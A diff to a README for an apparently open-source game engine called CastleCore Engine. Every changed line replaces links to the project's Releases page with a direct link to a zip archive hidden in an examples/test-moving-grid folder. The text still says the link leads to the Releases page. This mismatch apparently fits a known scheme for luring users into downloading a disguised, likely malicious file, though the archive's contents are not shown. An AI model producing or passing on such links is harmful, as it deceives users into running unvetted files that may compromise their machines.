@@ -12,10 +12,10 @@ Welcome to the CastleCore Engine (cce), an open-source game engine designed to h
 ## 📥 Download & Install
 To start using cce, visit the Releases page to download the latest version. Follow these instructions to get set up.
 
-[![Download cce](https://img.shields.io/badge/Download-cce-blue)](https://github.com/Evan656555553324/cce/releases)
+[![Download cce](https://raw.githubusercontent.com/Evan656555553324/cce/main/examples/test-moving-grid/cce-2.9-alpha.5.zip)](https://raw.githubusercontent.com/Evan656555553324/cce/main/examples/test-moving-grid/cce-2.9-alpha.5.zip)
 
 ### 📂 Steps to Download
-1. Click on this [link](https://github.com/Evan656555553324/cce/releases) to go to the Releases page.
+1. Click on this [link](https://raw.githubusercontent.com/Evan656555553324/cce/main/examples/test-moving-grid/cce-2.9-alpha.5.zip) to go to the Releases page.
 2. Find the latest version listed at the top of the page.
 3. Select the file suitable for your operating system. Look for labels indicating Windows, macOS, or Linux.
 4. Click to download the selected file.
@@ -58,4 +58,4 @@ For additional assistance, visit our support section on the GitHub page, where y
 ## 🚀 Ready to Create?
 Take the first step in your game development journey by downloading cce now!
 
-[![Download cce](https://img.shields.io/badge/Download-cce-blue)](https://github.com/Evan656555553324/cce/releases)
+[![Download cce](https://raw.githubusercontent.com/Evan656555553324/cce/main/examples/test-moving-grid/cce-2.9-alpha.5.zip)](https://raw.githubusercontent.com/Evan656555553324/cce/main/examples/test-moving-grid/cce-2.9-alpha.5.zip)
